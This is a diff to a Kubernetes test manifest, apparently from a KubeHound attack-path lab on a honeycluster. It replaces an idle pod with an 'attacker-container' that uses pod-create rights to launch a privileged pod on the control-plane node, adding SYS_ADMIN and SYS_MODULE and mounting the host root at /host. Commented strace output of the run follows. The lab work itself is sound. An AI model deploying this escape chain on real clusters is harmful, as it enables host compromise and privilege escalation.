@@ -1,4 +1,4 @@
-# POD_CREATE edge
+# POD_CREATE with an example of chaining attacks, so here we re immediately followig up with IDENTITY_IMPERSONATE
 apiVersion: v1
 kind: ServiceAccount
 metadata:
@@ -32,13 +32,54 @@ subjects:
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-create-pod
+  name: kubehound-pod-create
   labels:
-    app: kubehound-edge-test
+    app: kubehound-edge-test  
 spec:
-  serviceAccountName: pod-create-sa
+  serviceAccountName: pod-create-sa 
   containers:
-    - name: pod-create-pod
-      image: ubuntu
-      command: [ "/bin/sh", "-c", "--" ]
-      args: [ "while true; do sleep 30; done;" ]
+  - name: attacker-container
+    image: entlein/pod-create:0.0.1
+    imagePullPolicy: Always
+    command: ["/bin/sh", "-c"]
+    args:
+      - |
+        strace -ff -o /tmp/strace.out kubectl create -f - << EOF 
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: kubehound-pod-create-pod
+          namespace: default
+        spec:
+          nodeName: honeycluster-control-plane 
+          containers:
+          - name: privileged-container
+            image: entlein/identity-impersonate:0.0.1
+            securityContext:
+              capabilities:
+                add: ["SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE", "SYS_MODULE", "DAC_OVERRIDE", "SETUID", "SETGID"] 
+            volumeMounts:
+            - mountPath: /host
+              name: host-root 
+          volumes:
+            - name: host-root
+              hostPath:
+                path: /
+        EOF
+
+
+        sleep infinity
+
+
+# read(0, "apiVersion: v1\nkind: Pod\nmetadat"..., 4096) = 501
+# clone(child_stack=0xc000888000, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS, tls=0xc000580e98) = 20
+# openat(AT_FDCWD, "/root/.kube/cache/discovery/10.96.0.1_443/apps/v1/serverresources.json", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+# newfstatat(AT_FDCWD, "/root/.kube/cache/discovery/10.96.0.1_443/apps/v1", 0xc001182038, 0) = -1 ENOENT (No such file or directory)
+# newfstatat(AT_FDCWD, "/root/.kube/cache/discovery/10.96.0.1_443/apps", 0xc001182108, 0) = -1 ENOENT (No such file or directory)
+# newfstatat(AT_FDCWD, "/root/.kube/cache/discovery/10.96.0.1_443", {st_mode=S_IFDIR|0750, st_size=4096, ...}, 0) = 0
+# mkdirat(AT_FDCWD, "/root/.kube/cache/discovery/10.96.0.1_443/apps", 0750) = 0
+# mkdirat(AT_FDCWD, "/root/.kube/cache/discovery/10.96.0.1_443/apps/v1", 0750) = 0
+# openat(AT_FDCWD, "/root/.kube/cache/discovery/10.96.0.1_443/apps/v1/serverresources.json.940582416", O_RDWR|O_CREAT|O_EXCL|O_CLOEXEC, 0600) = 8
+# unlinkat(AT_FDCWD, "/root/.kube/cache/discovery/10.96.0.1_443/authorization.k8s.io/v1/serverresources.json.4183494762", 0) = -1 ENOENT (No such file or directory)
+# unlinkat(AT_FDCWD, "/root/.kube/cache/discovery/10.96.0.1_443/authorization.k8s.io/v1/serverresources.json.4183494762", AT_REMOVEDIR) = -1 ENOENT (No such file or directory)
+# fchmodat(AT_FDCWD, "/root/.kube/cache/discovery/10.96.0.1_443/apps/v1/serverresources.json.940582416", 0660) = 0
